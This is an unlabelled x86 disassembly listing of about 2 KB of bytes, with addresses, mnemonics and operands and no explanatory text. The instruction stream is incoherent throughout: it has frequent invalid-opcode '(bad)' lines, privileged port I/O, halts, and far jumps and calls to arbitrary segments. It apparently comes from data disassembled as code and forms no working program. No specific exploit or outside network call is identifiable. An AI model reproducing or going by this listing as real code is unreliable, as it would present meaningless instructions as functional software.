  45144f:	sub    DWORD PTR [esi+ebx*2-0x48],edx
  451453:	test   BYTE PTR [esi],dh
  451455:	push   ecx
  451456:	pop    ss
  451457:	mov    ebp,0x75e87619
  45145d:	mov    esi,0x9231eda
  451462:	fbld   TBYTE PTR [edx-0x25]
  451465:	stos   BYTE PTR es:[edi],al
  451466:	into   
  451467:	lds    esi,FWORD PTR [edx+0x56e27bc4]
  45146d:	sbb    eax,0x717eb7b
  451472:	in     al,0xb9
  451474:	cmp    DWORD PTR [ecx],edi
  451476:	(bad)  
  451477:	cmp    al,0x29
  451479:	or     dh,dl
  45147b:	cmp    BYTE PTR [ebp+0x4feeb962],0x9d
  451482:	sti    
  451483:	adc    edx,esi
  451485:	inc    ebx
  451486:	(bad)  
  451487:	mov    bh,0xec
  451489:	stos   BYTE PTR es:[edi],al
  45148a:	jb     0x4514ac
  45148c:	pop    ds
  45148d:	jns    0x4514f2
  45148f:	mov    WORD PTR [ebp+0x17],?
  451492:	push   0x34
  451494:	cmp    eax,0x1c6b7ba0
  451499:	inc    eax
  45149a:	das    
  45149b:	into   
  45149c:	cmp    BYTE PTR [ecx],dl
  45149e:	mov    cs,edi
  4514a0:	pusha  
  4514a1:	jmp    0x4d98:0xd0ec64bb
  4514a8:	xchg   DWORD PTR [edi+0x5c],edi
  4514ab:	dec    esi
  4514ac:	gs repz inc ebp
  4514af:	hlt    
  4514b0:	sub    ebx,DWORD PTR cs:0x78040538
  4514b7:	xchg   esi,eax
  4514b8:	pop    esp
  4514b9:	mov    WORD PTR [esi-0x2464f774],?
  4514bf:	cwde   
  4514c0:	mov    esi,edx
  4514c2:	ja     0x451451
  4514c4:	cmp    BYTE PTR [ebx+0x5f95f41f],al
  4514ca:	addr16 cmc 
  4514cc:	adc    eax,0x3ce62db5
  4514d1:	pop    edi
  4514d2:	sub    eax,0x5b9dfce3
  4514d7:	test   eax,0xdbf71659
  4514dc:	sbb    ebx,DWORD PTR [ecx-0x5278488e]
  4514e2:	mov    dh,BYTE PTR [ebx+0x603b9a8d]
  4514e8:	gs out dx,al
  4514ea:	pop    edi
  4514eb:	fidiv  WORD PTR [ebx]
  4514ed:	neg    DWORD PTR [ebx-0x94180e0]
  4514f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4514f4:	gs fadd st,st(4)
  4514f7:	repz xor eax,0x1480c88e
  4514fd:	add    eax,0x3ab100b
  451502:	adc    al,0x72
  451504:	fld    QWORD PTR [eax]
  451506:	(bad)  
  451507:	rcr    BYTE PTR fs:[ecx+0x58],0x97
  45150c:	push   ds
  45150d:	cdq    
  45150e:	test   BYTE PTR [esi-0x1295c1b],dh
  451514:	or     esp,DWORD PTR [ecx+0x1dbaeb87]
  45151a:	mov    ebx,0x6e391eff
  45151f:	dec    eax
  451520:	pop    edx
  451521:	scas   eax,DWORD PTR es:[edi]
  451522:	arpl   WORD PTR [ebx],ax
  451524:	xlat   BYTE PTR ds:[ebx]
  451525:	jg     0x4514f2
  451527:	dec    edi
  451528:	test   DWORD PTR [ebx-0xe],edi
  45152b:	repz imul edx,ebp,0x59928e7e
  451532:	lock sub ecx,DWORD PTR [esi-0x75]
  451536:	mov    ah,BYTE PTR [esi+0x62e3a752]
  45153c:	outs   dx,DWORD PTR ds:[esi]
  45153d:	push   edi
  45153e:	stos   DWORD PTR es:[edi],eax
  45153f:	jbe    0x451564
  451541:	jbe    0x451525
  451543:	loop   0x4514cd
  451545:	or     eax,0xb827355c
  45154a:	gs fldcw WORD PTR gs:[ecx]
  45154e:	add    DWORD PTR [ebx],0x25b57e82
  451554:	int3   
  451555:	inc    eax
  451556:	mov    eax,DWORD PTR [esi-0x17c88adb]
  45155c:	xor    al,0xb0
  45155e:	(bad)  
  45155f:	addr16 jbe 0x451598
  451562:	or     edi,ecx
  451564:	and    edi,ebp
  451566:	pop    edx
  451567:	push   es
  451568:	gs push ss
  45156a:	jle    0x4515da
  45156c:	dec    eax
  45156d:	sbb    cl,dh
  45156f:	xchg   esi,eax
  451570:	and    al,0xdb
  451572:	mov    esi,0xeba4f8d4
  451577:	cmc    
  451578:	stc    
  451579:	repnz mov dh,BYTE PTR [bp+0x75]
  45157e:	repnz int 0xdf
  451581:	shl    DWORD PTR [esi+0x1998b0a4],1
  451587:	je     0x45159d
  451589:	lds    edi,FWORD PTR [edx-0x54]
  45158c:	lds    esp,FWORD PTR ds:0x75bedcf
  451592:	addr16 std 
  451594:	and    BYTE PTR [ecx],cl
  451596:	adc    DWORD PTR [esi-0x34d6a6ed],eax
  45159c:	sbb    bl,ah
  45159e:	popf   
  45159f:	push   edi
  4515a0:	icebp  
  4515a1:	pushf  
  4515a2:	fisttp DWORD PTR [edi+0x184ca62b]
  4515a8:	add    eax,0xad475f1a
  4515ad:	mov    ds:0x62cfcaf7,eax
  4515b2:	ins    BYTE PTR es:[edi],dx
  4515b3:	xor    ch,cl
  4515b5:	bound  ebx,QWORD PTR [edx]
  4515b7:	retf   
  4515b8:	test   BYTE PTR [ebx-0x6cd2ab44],bl
  4515be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4515bf:	jo     0x45163a
  4515c1:	add    al,0xba
  4515c3:	les    eax,FWORD PTR [ebx-0x4a31ad44]
  4515c9:	add    eax,ebx
  4515cb:	in     eax,0xdf
  4515cd:	imul   dh
  4515cf:	daa    
  4515d0:	mov    bh,0xac
  4515d2:	ja     0x45158f
  4515d4:	(bad)  
  4515d7:	call   0xb5cf33ef
  4515dc:	push   cs
  4515dd:	ror    DWORD PTR [ebx-0xd],cl
  4515e0:	inc    edi
  4515e1:	adc    DWORD PTR [ebp+0x55],eax
  4515e4:	or     dl,BYTE PTR [edi]
  4515e6:	jo     0x451601
  4515e8:	sbb    ecx,ecx
  4515ea:	(bad)  
  4515eb:	fistp  WORD PTR [ebp-0x5b]
  4515ee:	shr    DWORD PTR [edi-0x62],1
  4515f1:	xchg   esp,eax
  4515f2:	mov    ecx,0xa7d5e912
  4515f7:	(bad)  
  4515f8:	cmc    
  4515f9:	in     eax,dx
  4515fa:	leave  
  4515fb:	xchg   esp,eax
  4515fc:	(bad)  
  4515fe:	jno    0x45162d
  451600:	std    
  451601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  451602:	sti    
  451603:	ficomp DWORD PTR [ebx]
  451605:	jmp    0xf6fc:0x90c06476
  45160c:	in     al,dx
  45160d:	inc    esp
  45160e:	out    dx,eax
  45160f:	adc    al,0x95
  451611:	mov    DWORD PTR [ecx-0x47d24c02],edi
  451617:	(bad)  
  451618:	xor    eax,0xb6f4587f
  45161d:	xchg   ecx,eax
  45161e:	mov    WORD PTR [edi],fs
  451620:	and    cl,cl
  451622:	adc    DWORD PTR [ebp-0x54],ecx
  451625:	pop    ss
  451626:	ret    0xf0b5
  451629:	mov    bl,0xdb
  45162b:	out    dx,al
  45162c:	call   0x697a9481
  451631:	fcomp  QWORD PTR [edx-0x3a]
  451634:	adc    al,0x5a
  451636:	aaa    
  451637:	push   esi
  451638:	fwait
  451639:	lahf   
  45163a:	in     eax,dx
  45163b:	daa    
  45163c:	out    dx,eax
  45163d:	cdq    
  45163e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45163f:	imul   edx,DWORD PTR [edi],0xffffffca
  451642:	fwait
  451643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451644:	int    0x5b
  451646:	(bad)  
  451647:	out    0x68,eax
  451649:	jae    0x4516b2
  45164b:	push   esi
  45164c:	add    eax,0xcdc5693d
  451651:	test   eax,0x8dacef84
  451656:	xchg   ebx,eax
  451657:	push   0x15
  451659:	mov    dh,0xbb
  45165b:	jmp    0xf027:0x41efa82b
  451662:	shl    DWORD PTR [ebp-0x5a],1
  451665:	fbstp  TBYTE PTR [ebx-0x45c52d3c]
  45166b:	mov    bl,0xe5
  45166d:	sbb    BYTE PTR [esi-0x19],al
  451670:	cmp    BYTE PTR [eax],al
  451672:	pop    esi
  451673:	sbb    al,0x21
  451675:	mov    ecx,0x969cdf8f
  45167a:	shl    DWORD PTR [edx+0x32cc9b0],cl
  451680:	or     DWORD PTR [ebx+0x2ab82e2b],esp
  451686:	push   es
  451687:	into   
  451688:	and    eax,0x8674769
  45168d:	sar    DWORD PTR [eax+0x3c],1
  451690:	push   ebx
  451691:	sbb    al,0xbb
  451693:	and    eax,0xd26111e6
  451698:	sbb    eax,0x9355ab29
  45169d:	jecxz  0x451652
  45169f:	dec    edx
  4516a0:	xor    eax,esp
  4516a2:	mov    BYTE PTR [esi+0x51],dl
  4516a5:	bound  edi,QWORD PTR [eax+ebx*1+0x66ea5a13]
  4516ac:	aad    0xc7
  4516ae:	test   ecx,ebp
  4516b0:	sahf   
  4516b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4516b2:	dec    BYTE PTR [ebp+0x5dbcab04]
  4516b8:	pop    ds
  4516b9:	dec    ecx
  4516ba:	push   ebx
  4516bb:	leave  
  4516bc:	in     eax,dx
  4516bd:	ins    BYTE PTR es:[edi],dx
  4516be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4516bf:	into   
  4516c0:	(bad)  
  4516c1:	add    BYTE PTR [ebx],al
  4516c3:	and    DWORD PTR [ebx],eax
  4516c5:	mov    al,ds:0x18ce318a
  4516ca:	mov    eax,0xb2a8453d
  4516cf:	mov    ah,0x93
  4516d1:	loope  0x451671
  4516d3:	jb     0x45167f
  4516d5:	inc    DWORD PTR [edi]
  4516d7:	repz xlat BYTE PTR ds:[ebx]
  4516d9:	pop    ds
  4516da:	push   cs
  4516db:	fdivr  st(5),st
  4516dd:	cmp    bh,BYTE PTR [edx-0x43a77912]
  4516e3:	and    bh,BYTE PTR [ebx]
  4516e5:	pop    ecx
  4516e6:	cmp    BYTE PTR [ebx+eiz*2+0x714dfea0],cl
  4516ed:	mov    bh,0x99
  4516ef:	icebp  
  4516f0:	jbe    0x45172f
  4516f2:	jg     0x451716
  4516f4:	int    0x2e
  4516f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4516f7:	pop    edx
  4516f8:	sti    
  4516f9:	leave  
  4516fa:	mov    ebx,0x91f91e3f
  4516ff:	inc    ebx
  451700:	and    eax,0x89e33768
  451705:	pushf  
  451706:	xor    dl,BYTE PTR ds:0xefa965e5
  45170c:	std    
  45170d:	inc    ebp
  45170e:	cmp    edi,DWORD PTR [edx]
  451710:	pop    ds
  451711:	dec    ecx
  451712:	sbb    DWORD PTR [eax+0x1122ae59],edi
  451718:	xor    ecx,DWORD PTR [edi+0x480c16cc]
  45171e:	retf   0x3309
  451721:	xor    bh,BYTE PTR [ebp+0x19091f00]
  451727:	mov    WORD PTR gs:[esi-0x80],cs
  45172b:	cmp    al,0x2b
  45172d:	std    
  45172e:	sub    al,0xef
  451730:	(bad)  
  451731:	push   ebp
  451732:	lods   al,BYTE PTR ds:[esi]
  451733:	sub    eax,0x56041124
  451738:	inc    edx
  451739:	gs into 
  45173b:	dec    edx
  45173c:	xlat   BYTE PTR ds:[ebx]
  45173d:	push   ebp
  45173e:	mov    edi,0x8b61b8f4
  451743:	in     al,dx
  451744:	push   esi
  451745:	icebp  
  451746:	call   0x29b29366
  45174b:	push   es
  45174c:	mov    esp,esi
  45174e:	cmp    al,0x21
  451750:	inc    esp
  451751:	cmc    
  451752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451753:	jbe    0x45176d
  451755:	test   eax,0x60b139e8
  45175a:	push   ss
  45175b:	dec    edi
  45175c:	es lahf 
  45175e:	lods   al,BYTE PTR ds:[esi]
  45175f:	cmp    eax,0x6f2799ca
  451764:	vpcmpgtb xmm2,xmm5,XMMWORD PTR [eax]
  451768:	pop    ecx
  451769:	repz mov esi,0xdddb244
  45176f:	out    0xd5,al
  451771:	lods   al,BYTE PTR ds:[esi]
  451772:	ds jmp 0x4517df
  451775:	mov    esi,0x9923ea14
  45177a:	mov    esi,0xf61fb680
  45177f:	addr16 xchg esi,eax
  451781:	mov    dh,0xab
  451783:	arpl   WORD PTR [eax+eax*8],sp
  451786:	jge    0x45173a
  451788:	cmp    DWORD PTR [eax+0x2920ac9d],esp
  45178e:	mov    ah,0x2
  451790:	sahf   
  451791:	xchg   edi,eax
  451792:	loope  0x4517fe
  451794:	push   0x371e5bd6
  451799:	xchg   ebp,eax
  45179a:	div    BYTE PTR [ebx]
  45179c:	and    eax,0x98850401
  4517a1:	and    BYTE PTR ds:0x875851be,ch
  4517a7:	push   es
  4517a8:	push   esi
  4517a9:	out    dx,eax
  4517aa:	mov    eax,0xfba510bc
  4517af:	imul   ecx,esi,0x3a
  4517b2:	mov    ds:0xc6068383,eax
  4517b7:	pop    ecx
  4517b8:	xchg   ecx,eax
  4517b9:	pop    edi
  4517ba:	and    eax,0x35391df6
  4517bf:	in     al,0xc9
  4517c1:	sbb    edx,ebp
  4517c3:	mov    eax,ds:0x4ae11921
  4517c8:	cwde   
  4517c9:	out    dx,eax
  4517ca:	jecxz  0x451792
  4517cc:	xor    DWORD PTR [edi-0x46191ce5],esp
  4517d2:	jge    0x451842
  4517d4:	push   ebp
  4517d5:	inc    ebp
  4517d6:	adc    ebx,0xd6116a77
  4517dc:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4517de:	rol    DWORD PTR [eax+eiz*4-0x18],0x99
  4517e3:	sbb    BYTE PTR [ebp-0x1],dl
  4517e6:	loopne 0x4517ce
  4517e8:	fcomip st,st(2)
  4517ea:	ret    0x1515
  4517ed:	mov    ebp,DWORD PTR [edi+0x73]
  4517f0:	mov    ebx,0x521746f5
  4517f5:	sub    DWORD PTR [eax-0x35db7718],edi
  4517fb:	dec    esi
  4517fc:	xlat   BYTE PTR ds:[ebx]
  4517fd:	mov    ds:0x77382abb,eax
  451802:	inc    eax
  451803:	pop    ebp
  451804:	push   0xffffff8e
  451806:	test   DWORD PTR [esi-0x6b4d192f],0xfb1edd8d
  451810:	mov    ch,0xa5
  451812:	and    eax,0x12277fef
  451817:	bound  eax,QWORD PTR [edi-0x77]
  45181a:	retf   0x16d6
  45181d:	scas   eax,DWORD PTR es:[edi]
  45181e:	jecxz  0x45186c
  451820:	sahf   
  451821:	loopne 0x451859
  451823:	jae    0x45182a
  451825:	icebp  
  451826:	mov    edx,edx
  451828:	cmp    ebp,DWORD PTR [ecx]
  45182a:	repz cmp eax,0xd2bc4276
  451830:	push   ss
  451831:	loope  0x451893
  451833:	arpl   WORD PTR [eax],sp
  451835:	pop    esi
  451836:	cmp    BYTE PTR [ecx-0x5f],dh
  451839:	fwait
  45183a:	imul   ebp,DWORD PTR [eax+0x1d3d7974],0x78
  451841:	mov    eax,ds:0x83a7778b
  451846:	(bad)  
  451847:	push   ecx
  451848:	mov    ch,0xe0
  45184a:	jb     0x451826
  45184c:	cmp    DWORD PTR [ebx+0x413d5678],ecx
  451852:	es inc ebp
  451854:	inc    edx
  451855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451856:	mov    edx,0xa0e7469d
  45185b:	pop    ss
  45185c:	ds mov bl,0x51
  45185f:	aad    0xb
  451861:	sbb    DWORD PTR [esi-0x61d0fde4],esi
  451867:	(bad)  
  451868:	and    eax,0xdca290a1
  45186d:	inc    ebx
  45186e:	cdq    
  45186f:	cmp    DWORD PTR [ebp-0x33],esp
  451872:	iret   
  451873:	in     eax,0xa7
  451875:	test   al,0x37
  451877:	pop    es
  451878:	aas    
  451879:	test   al,0x48
  45187b:	data16 fxch st(3)
  45187e:	in     al,0x25
  451880:	adc    al,0x9e
  451882:	bound  edx,QWORD PTR ds:0xf4a70695
  451888:	push   edi
  451889:	and    DWORD PTR [esi-0x7e],edi
  45188c:	pop    ss
  45188d:	jmp    0xd935183b
  451892:	dec    edi
  451893:	shl    DWORD PTR [edx+eiz*2+0x63],cl
  451897:	and    eax,0xd5e02df7
  45189c:	adc    DWORD PTR [ecx+ebp*1-0x44ed2b0b],0x8c8f8d8c
  4518a7:	out    dx,al
  4518a8:	and    al,0x9
  4518aa:	mov    eax,ds:0xf12d9ea4
  4518af:	nop
  4518b0:	out    0x99,eax
  4518b2:	mov    ebx,0x2d7d7679
  4518b7:	in     eax,dx
  4518b8:	(bad)  
  4518b9:	or     eax,0xa631a94a
  4518be:	out    dx,eax
  4518bf:	xor    al,0x7
  4518c1:	call   0x431b:0xa89647f6
  4518c8:	sbb    dh,BYTE PTR [ecx]
  4518ca:	call   0xe5f3e1ee
  4518cf:	xchg   ecx,eax
  4518d0:	pop    ecx
  4518d1:	inc    ecx
  4518d2:	lods   eax,DWORD PTR ds:[esi]
  4518d3:	in     eax,0xe3
  4518d5:	bound  ebx,QWORD PTR [edx-0x11]
  4518d8:	lods   eax,DWORD PTR ds:[esi]
  4518d9:	inc    eax
  4518da:	cmp    esi,DWORD PTR [eax]
  4518dc:	inc    ebp
  4518dd:	and    al,bh
  4518df:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4518e1:	push   ebx
  4518e2:	mov    ebp,DWORD PTR [ebx+eiz*1]
  4518e5:	fldenv [esp+ebp*8+0x1cc27e8a]
  4518ec:	dec    eax
  4518ed:	or     ecx,esp
  4518ef:	lods   eax,DWORD PTR ds:[esi]
  4518f0:	adc    bl,BYTE PTR [ebx+0x57]
  4518f3:	xlat   BYTE PTR ds:[ebx]
  4518f4:	mov    ebx,0xa1e792ef
  4518f9:	std    
  4518fa:	mov    cl,0x90
  4518fc:	out    0x49,eax
  4518fe:	mov    edi,edx
  451900:	xchg   ebp,eax
  451901:	mov    al,ds:0xbd994cb2
  451906:	bound  ebp,QWORD PTR [eax]
  451908:	fstp   QWORD PTR [edi-0x14e59427]
  45190e:	outs   dx,DWORD PTR ds:[esi]
  451910:	inc    ebp
  451911:	les    ebp,FWORD PTR [eax-0x14]
  451914:	fs lahf 
  451916:	jno    0x4518da
  451918:	and    al,0xd9
  45191a:	in     al,0xa0
  45191c:	push   ebx
  45191d:	fwait
  45191e:	shl    BYTE PTR [eax],0x82
  451921:	cdq    
  451922:	(bad)  [edi]
  451924:	adc    DWORD PTR [edx+0x768e0259],ebp
  45192a:	stos   DWORD PTR es:[edi],eax
  45192b:	pop    edx
  45192c:	add    ebp,eax
  45192e:	jmp    0xc171:0x44a59b24
  451935:	aam    0x9b
  451937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451938:	outs   dx,BYTE PTR ds:[esi]
  451939:	rol    DWORD PTR [ebx],0xc4
  45193c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  45193d:	ret    
  45193e:	mov    dl,0x3e
  451940:	sbb    al,0x29
  451942:	out    0xa7,al
  451944:	xlat   BYTE PTR ds:[ebx]
  451945:	stos   BYTE PTR es:[edi],al
  451946:	(bad)  
  451947:	retf   0x9fa7
  45194a:	mov    eax,DWORD PTR [edi-0x6c]
  45194d:	push   esi
  45194e:	xor    al,0x69
  451950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451951:	(bad)
  451954:	mov    ebp,0xcb14ba5f
  451959:	addr16 dec eax
  45195b:	xchg   ch,dh
  45195d:	mov    eax,ds:0x3384f0d6
  451962:	pop    edx
  451963:	add    ebx,DWORD PTR [ebx]
  451965:	leave  
  451966:	test   al,0x66
  451968:	outs   dx,DWORD PTR ds:[esi]
  451969:	xchg   edx,eax
  45196a:	sbb    al,0x89
  45196c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  45196e:	retf   
  45196f:	int    0xe7
  451971:	pop    ebx
  451972:	test   DWORD PTR [edx],eax
  451974:	adc    BYTE PTR [ecx],ah
  451976:	test   DWORD PTR [ebp+0x34b427fb],0x10e5d889
  451980:	jne    0x451929
  451982:	push   es
  451983:	out    dx,eax
  451984:	aad    0x90
  451986:	loop   0x4519f1
  451988:	and    ebx,DWORD PTR [ecx-0x4bbdd721]
  45198e:	add    eax,0xbba0b9ad
  451993:	and    esp,edi
  451995:	js     0x4519c4
  451997:	lods   al,BYTE PTR ds:[esi]
  451998:	jl     0x4519a6
  45199a:	(bad)  
  45199c:	(bad)  
  45199d:	loop   0x45194b
  45199f:	push   ss
  4519a0:	fidivr DWORD PTR ds:0x220890b8
  4519a6:	add    DWORD PTR [ebx+0x1c],edi
  4519a9:	test   eax,0xef820a80
  4519ae:	sbb    bl,BYTE PTR [ecx+0x1c]
  4519b1:	jns    0x451944
  4519b3:	jge    0x45194e
  4519b5:	and    eax,0xf4c35167
  4519ba:	fld    TBYTE PTR [edi]
  4519bd:	mov    DWORD PTR [ebx-0x6b8bb2aa],ebx
  4519c3:	repnz sbb ecx,ebp
  4519c6:	in     eax,0xb2
  4519c8:	sub    al,0x35
  4519ca:	mov    al,0x1a
  4519cc:	js     0x451976
  4519ce:	mov    eax,DWORD PTR [edx-0x56adcae3]
  4519d4:	push   esp
  4519d5:	ja     0x4519eb
  4519d7:	ret    0x9e0f
  4519da:	cmp    ebx,DWORD PTR [ecx+0xd46292e]
  4519e0:	rcr    DWORD PTR [ebp+0x342789fb],1
  4519e6:	mov    cl,0xec
  4519e8:	ds mov esp,0x2191ebfc
  4519ee:	mov    edx,0x10998a24
  4519f3:	cli    
  4519f4:	out    dx,eax
  4519f5:	lahf   
  4519f6:	jmp    0x451a5f
  4519f8:	int    0x21
  4519fa:	mov    ds:0x2625d3aa,al
  4519ff:	pop    esp
  451a00:	(bad)  
  451a02:	mov    ebx,0xf031e04
  451a07:	add    BYTE PTR [esi+0x26],al
  451a0a:	pop    ecx
  451a0b:	jns    0x451a0a
  451a0d:	push   0x3cae82b4
  451a12:	mov    cl,0x44
  451a14:	ss test al,0x9b
  451a17:	adc    bh,ah
  451a19:	call   0x6008:0x81f61791
  451a20:	mov    cl,0xed
  451a22:	ret    0x9524
  451a25:	fld    QWORD PTR [eax]
  451a27:	(bad)  
  451a29:	popf   
  451a2a:	sti    
  451a2b:	push   ebx
  451a2c:	mov    esp,0xd6c8bdd
  451a31:	dec    ebp
  451a32:	das    
  451a33:	imul   eax,DWORD PTR [esi+esi*1],0xffffffb8
  451a37:	fs int3 
  451a39:	add    DWORD PTR [edx+edx*4-0x69],esi
  451a3d:	int    0x93
  451a3f:	or     DWORD PTR [eax],0x25
  451a42:	stos   DWORD PTR es:[edi],eax
  451a43:	cs pop ss
  451a45:	mov    DWORD PTR [ecx-0x459aab18],ebx
  451a4b:	cmp    DWORD PTR [edi-0x53],eax
  451a4e:	fwait
  451a4f:	mov    dl,0x63
  451a51:	popf   
  451a52:	jg     0x451abc
  451a54:	pop    ds
  451a55:	rol    DWORD PTR [edi+0x39389576],1
  451a5b:	add    ecx,DWORD PTR [eax]
  451a5d:	stos   BYTE PTR es:[edi],al
  451a5e:	mov    eax,0x5a1b03c4
  451a63:	inc    edi
  451a64:	test   eax,0xe2d11e08
  451a69:	adc    eax,0xb54034be
  451a6e:	lahf   
  451a6f:	popf   
  451a70:	push   es
  451a71:	rcr    ebp,0xd5
  451a74:	sub    esp,DWORD PTR [edi-0x60506b49]
  451a7a:	fild   DWORD PTR [ecx+0x18]
  451a7d:	ficom  DWORD PTR [edx+0x5b]
  451a80:	mov    bl,BYTE PTR [ebp+0x69]
  451a83:	sbb    dl,BYTE PTR [ebp+0x1b36d06]
  451a89:	or     al,0x74
  451a8b:	cmp    BYTE PTR [edx+0x3991d4fb],ah
  451a91:	cmp    DWORD PTR [edx+0x4049faa0],edi
  451a97:	test   al,0xfd
  451a99:	ja     0x451a52
  451a9b:	adc    al,0x69
  451a9d:	push   ebp
  451a9e:	imul   edi,esi,0xffffff9c
  451aa1:	fwait
  451aa2:	imul   ecx,eax,0x7e
  451aa5:	cmp    ebx,edi
  451aa7:	add    al,0x81
  451aa9:	call   0xa2a9:0xda12850b
  451ab0:	push   ebx
  451ab1:	mov    ebx,0xdb5b61d6
  451ab6:	mov    edx,0x677f2e54
  451abb:	adc    BYTE PTR [esi-0x7c],ah
  451abe:	pop    edx
  451abf:	and    BYTE PTR [ebx+0x56],al
  451ac2:	sub    dl,BYTE PTR [ebx+0x6b]
  451ac5:	ss mov edx,0xf9c79fcd
  451acb:	add    esi,eax
  451acd:	jnp    0x451a8c
  451acf:	aam    0xeb
  451ad1:	mov    cl,0x3b
  451ad3:	fbstp  TBYTE PTR ds:0x85f0bda4
  451ad9:	lea    eax,[edi+0x75]
  451adc:	and    DWORD PTR [ecx+esi*2-0x330f0fae],esi
  451ae3:	hlt    
  451ae4:	cwde   
  451ae5:	lock push esp
  451ae7:	sub    esp,eax
  451ae9:	outs   dx,DWORD PTR ds:[esi]
  451aea:	mov    esp,0x287ff620
  451aef:	pop    esi
  451af0:	mov    dl,0xc2
  451af2:	mov    ebp,0x7b572569
  451af7:	mov    esp,0xd4b010ae
  451afc:	push   0x7a
  451afe:	pusha  
  451aff:	out    0x16,al
  451b01:	daa    
  451b02:	into   
  451b03:	pop    ebx
  451b04:	out    dx,al
  451b05:	mov    eax,ds:0xc8d7f4f5
  451b0a:	sti    
  451b0b:	cmc    
  451b0c:	pop    ds
  451b0d:	sub    DWORD PTR [edx+0x14],edi
  451b10:	sub    DWORD PTR [esi+ebx*1-0x545ccf32],esp
  451b17:	test   eax,0x2d67458a
  451b1c:	push   ebx
  451b1d:	adc    DWORD PTR [esi-0x25d6f755],eax
  451b23:	mov    ebx,0x5c9691a
  451b28:	jmp    0x7455f736
  451b2d:	mov    ds:0xfb0235eb,al
  451b32:	fidiv  DWORD PTR [esi+ebx*4-0x1b6452b3]
  451b39:	mov    ecx,0x12212520
  451b3e:	les    esp,FWORD PTR [ebp+esi*2-0x71]
  451b42:	push   ebx
  451b43:	xchg   edx,eax
  451b44:	(bad)  
  451b45:	fisub  DWORD PTR [edi+0x36009818]
  451b4b:	aaa    
  451b4c:	fstp   TBYTE PTR [ebx-0x3a407dce]
  451b52:	fsub   DWORD PTR [esi+eax*8]
  451b55:	in     eax,0xc2
  451b57:	push   ebx
  451b58:	xchg   esi,eax
  451b59:	popf   
  451b5a:	jl     0x451bb7
  451b5c:	ret    
  451b5d:	aaa    
  451b5e:	call   0x67dc:0xd9a990eb
  451b65:	or     eax,0x3c5f2bab
  451b6a:	mov    esp,0xd1c6f977
  451b6f:	outs   dx,DWORD PTR ds:[esi]
  451b70:	fldenv [ecx-0x643bc33d]
  451b76:	aaa    
  451b77:	push   0x1d
  451b79:	leave  
  451b7a:	cmc    
  451b7b:	cs adc eax,0x28094634
  451b81:	pop    ss
  451b82:	mov    eax,?
  451b84:	in     eax,dx
  451b85:	pop    ebp
  451b86:	jns    0x451b4f
  451b88:	jmp    ebp
  451b8a:	vpaddw ymm2,ymm3,YMMWORD PTR [edx]
  451b8e:	add    BYTE PTR [ecx+edi*8+0x3a],ch
  451b92:	mov    esi,0xca2f4784
  451b97:	outs   dx,DWORD PTR ds:[esi]
  451b98:	and    bl,BYTE PTR [edx-0x6f1fadc5]
  451b9e:	xor    al,0xf0
  451ba0:	xchg   ebx,eax
  451ba1:	mov    dh,0xd5
  451ba3:	sub    eax,0x15a38837
  451ba8:	sbb    eax,0x50ea674f
  451bad:	push   esi
  451bae:	das    
  451baf:	stos   DWORD PTR es:[edi],eax
  451bb0:	sbb    cl,BYTE PTR [ecx]
  451bb2:	jne    0x451bfc
  451bb4:	xchg   ecx,eax
  451bb5:	shr    BYTE PTR [ecx-0x5696e3f0],1
  451bbb:	xor    DWORD PTR [ebp+0x7793bc66],edx
  451bc1:	call   0xd035:0x3a41f0b
  451bc8:	mov    BYTE PTR [ebp+0xc010d38],bl
  451bce:	test   DWORD PTR es:[edi],ebx
  451bd1:	into   
  451bd2:	ret    
  451bd3:	rol    DWORD PTR [esi+0x7c7cba4],cl
  451bd9:	inc    esp
  451bda:	add    eax,0xca96d9ce
  451bdf:	dec    esi
  451be0:	cld    
  451be1:	push   cs
  451be2:	mov    al,0x44
  451be4:	mul    DWORD PTR [edi]
  451be6:	fild   WORD PTR [ebp-0xf24514b]
  451bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  451bed:	sub    al,0x94
  451bef:	stos   DWORD PTR es:[edi],eax
  451bf0:	and    DWORD PTR [ecx-0x6bc97078],ebx
  451bf6:	jae    0x451bec
  451bf8:	sbb    eax,0x6e9b5c11
  451bfd:	adc    al,BYTE PTR [edx+0x6088a0a]
  451c03:	jmp    0x54fd:0x67b74924
  451c0a:	cdq    
  451c0b:	lods   eax,DWORD PTR ds:[esi]
  451c0c:	adc    eax,0xa53862ac
  451c11:	push   esp
  451c12:	mov    al,ch
  451c14:	(bad)  
  451c15:	in     al,dx
  451c16:	jbe    0x451c8b
  451c18:	xchg   BYTE PTR [ecx-0x333533f8],cl
  451c1e:	xor    al,0x4c
  451c20:	outs   dx,BYTE PTR ds:[esi]
  451c21:	mov    eax,ds:0x8b658eb0
  451c26:	arpl   dx,si
  451c28:	push   esi
  451c29:	(bad)  
  451c2a:	loope  0x451c95
  451c2c:	in     al,0xac
  451c2e:	or     BYTE PTR [edx],bl
  451c30:	sbb    eax,0x1d1f23de
  451c35:	cdq    
  451c36:	out    0xfe,eax
  451c38:	out    0xf7,al
  451c3a:	scas   eax,DWORD PTR es:[edi]
  451c3b:	jns    0x451cab
  451c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451c3e:	pop    ebx
  451c3f:	mov    BYTE PTR [ecx+0x59],ah
  451c42:	jmp    0x9488:0x2fc2ac37
  451c49:	jmp    0x29fc1871
  451c4e:	ja     0x451be7
  451c50:	xor    BYTE PTR [edi-0x70],0x23
  451c54:	mov    ss,WORD PTR [ebx-0x55]
  451c57:	out    0x19,eax
  451c59:	cmp    eax,0x7ee188d1
  451c5e:	mov    bl,0xdc
  451c60:	(bad)  
